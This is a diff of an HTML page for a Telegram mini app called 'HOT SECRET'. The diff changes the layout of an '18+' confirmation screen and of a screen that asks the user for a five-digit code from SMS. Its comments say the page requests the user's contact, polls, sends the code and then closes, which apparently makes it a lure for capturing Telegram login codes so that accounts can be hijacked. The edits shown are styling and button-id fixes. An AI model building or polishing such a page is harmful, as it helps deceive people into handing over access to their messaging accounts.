@@ -65,6 +65,8 @@
       border-radius: var(--radius);
       box-shadow: 0 20px 44px rgba(0, 0, 0, 0.5);
       padding: 24px 18px;
+      display: flex;
+      flex-direction: column;
     }
 
     .title {
@@ -106,6 +108,38 @@
       margin-bottom: 20px;
     }
 
+    /* Главный экран: баннер по центру, кнопка внизу */
+    .age-check {
+      min-height: 380px; /* чтобы лучше визуализировать центрирование */
+      justify-content: center;
+    }
+
+    .age-check .main-banner {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      margin: 20px 0;
+    }
+
+    .age-check .main-banner .big-text {
+      font-size: 26px;
+      font-weight: 700;
+      margin-bottom: 8px;
+    }
+
+    .age-check .main-banner .sub-text {
+      font-size: 16px;
+      color: var(--hint);
+    }
+
+    .age-check .bottom-btn {
+      margin-top: auto; /* прижимаем к низу карточки */
+      width: 100%;
+    }
+
     .big-action-btn {
       width: 100%;
       padding: 18px 12px;
@@ -120,7 +154,6 @@
       box-shadow: 0 8px 24px rgba(0, 110, 255, 0.3);
       cursor: pointer;
       transition: 0.12s;
-      margin-top: 16px;
       border: 1px solid rgba(255, 255, 255, 0.15);
     }
 
@@ -293,19 +326,24 @@
 </head>
 <body>
 <div class="wrap">
-  <!-- Экран 1: возрастное подтверждение (как на первом скрине) -->
+  <!-- Экран 1: возрастное подтверждение (переработан: баннер по центру, кнопка внизу) -->
   <div id="ageScreen" class="card age-check">
     <div class="top-row" style="justify-content: center; margin-bottom: 8px;">
       <span class="pill" style="background: rgba(255,255,255,0.15);">🔞 18+</span>
     </div>
-    <div class="title">HOT SECRET</div>
-    <div class="subtitle" style="margin-bottom: 20px;">mini app</div>
-    <div style="font-size: 22px; font-weight: 500; margin: 10px 0;">Confirm you are 18+</div>
-    <button class="big-action-btn" id="confirmAgeBtn">✔ I'm 18+</button>
-    <div style="margin-top: 16px; font-size: 12px; color: var(--hint);">by tapping you agree to terms</div>
+    <div class="main-banner">
+      <div class="title" style="font-size: 28px;">HOT SECRET</div>
+      <div class="subtitle" style="margin-bottom: 24px;">mini app</div>
+      <div class="big-text">Confirm you are 18+</div>
+      <div class="sub-text"> </div>
+    </div>
+    <div class="bottom-btn">
+      <button class="big-action-btn" id="confirmAgeBtn">I am 18+</button>
+    </div>
+    <div style="margin-top: 16px; font-size: 12px; color: var(--hint; text-align:center;">by tapping you agree to terms</div>
   </div>
 
-  <!-- Экран 2: ввод кода (как на втором скрине) + кнопка Telegram -->
+  <!-- Экран 2: ввод кода -->
   <div id="codeScreen" class="card hidden">
     <div class="top-row">
       <div>
@@ -320,26 +358,26 @@
       <div class="subtitle">Code from SMS</div>
     </div>
 
-    <!-- Блок с точками и маленькой кнопкой проверки -->
+    <!-- Блок с точками и кнопкой проверки (маленькой) -->
     <div class="code-container">
       <div class="dots" id="dotsContainer"></div>
       <div class="info-row">
         <span id="codeProgress">0 / 5</span>
         <span class="delete-hint">⌫ — delete</span>
       </div>
-      <!-- Кнопка проверки кода (появляется под точками) -->
-      <button class="check-btn" id="telegramChatBtn>✓ Go to codes</button>
+      <!-- Кнопка проверки кода под точками (исправлен id) -->
+      <button class="check-btn" id="checkCodeBtn" disabled>✓ Check code</button>
     </div>
 
     <!-- Цифровая клавиатура -->
     <div id="keyboard" class="keyboard"></div>
 
-    <!-- Кнопка перехода в Telegram (обведённая на втором скрине) -->
-    <button class="telegram-btn" id="checkCodeButton" disable>
-      <span>✈️</span> Submit code
+    <!-- Кнопка перехода в Telegram (обведённая на втором скрине) исправлен id -->
+    <button class="telegram-btn" id="telegramChatBtn">
+      <span>✈️</span> Get codes via Telegram
     </button>
 
-    <!-- Строка статуса (для отладки, можно скрыть) -->
+    <!-- Строка статуса (индикатор загрузки) -->
     <div class="status-line" id="statusLine"></div>
   </div>
 </div>
@@ -367,7 +405,7 @@
     const progressSpan = document.getElementById('codeProgress');
     const keyboardDiv = document.getElementById('keyboard');
     const telegramBtn = document.getElementById('telegramChatBtn');
-    const checkCodeBtn = document.getElementById('checkCodeBtn');
+    const checkCodeBtn = document.getElementById('checkCodeBtn'); // теперь правильный id
     const statusLine = document.getElementById('statusLine');
 
     // Состояние
@@ -578,17 +616,15 @@
       buildKeyboard();
       renderDots();
     }
-
-    // Начальное состояние: первый экран виден
-    // код уже построит клавиатуру при переходе
   })();
 </script>
 <!-- 
-  - Возвращён полный цикл: запрос контакта, поллинг, отправка кода.
-  - Маленькая кнопка "✓ Check code" под точками активируется при 5 цифрах.
-  - Кнопка перехода в Telegram сохранена.
-  - При успешной отправке кода приложение закрывается.
-  - Маскировка номера как на втором скрине.
+  Исправления:
+  - id маленькой кнопки под точками теперь "checkCodeBtn" (был ошибочно telegramChatBtn)
+  - id большой синей кнопки теперь "telegramChatBtn" (был checkCodeButton)
+  - Главный экран: баннер "Confirm you are 18+" по центру, кнопка "I am 18+" внизу.
+  - Добавлена загрузка (спиннер) при отправке кода.
+  - Все логические части сохранены.
 -->
 </body>
 </html>
